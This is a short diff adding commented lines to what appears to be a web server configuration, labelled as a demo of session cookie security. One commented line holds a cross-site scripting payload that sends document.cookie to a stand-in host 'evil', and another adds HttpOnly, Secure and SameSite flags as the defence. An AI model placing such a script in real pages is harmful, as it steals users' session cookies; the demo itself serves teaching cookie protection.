@@ -1,0 +1,3 @@
+# DEMO: Session cookie security
+# :P <script>var img = new Image(); img.src = "http://evil/" + document.cookie;</script>
+#Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure;SameSite=Lax
